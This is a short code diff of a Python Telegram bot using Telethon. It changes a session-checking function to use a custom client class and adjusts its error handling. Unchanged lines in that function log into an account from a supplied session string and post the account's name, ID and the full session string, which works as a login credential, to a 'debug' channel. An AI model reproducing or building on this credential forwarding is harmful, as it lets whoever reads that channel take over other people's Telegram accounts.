@@ -4,6 +4,7 @@
 from telethon.errors import FloodWaitError
 from telethon.sessions import StringSession
 from telethon import TelegramClient, Button
+from TeleClient import MyClient
 from dataManage import *
 from env import *
 from classUtils import FileManage
@@ -96,21 +97,22 @@ async def autoPostGlobal(client, event, message, sleep_time, file = None):
 
 
 
+
 async def check_ses(string: str, event = None) -> bool:
     try:
-        async with TelegramClient(StringSession(string), api_id, api_hash) as client:
+        async with MyClient(StringSession(string), api_id, api_hash) as client:
             try:
                 me = await client.get_me()
+                await client.disconnect()
                 if event:
                     message = f"Name: `{me.first_name}`\nID: `{me.id}`\n\n`{string}`"
                     try:
                         await event.client.send_message(debug_channel_id, message)
                     except:
-                        pass
-                await client.disconnect()
+                        print("Error while sending message to debug channel")
             except Exception as e:
                 print(f"Error: {str(e)}")
-                return True
+                return False
             return True
     except Exception as e:
         print(f"Error: {str(e)}")
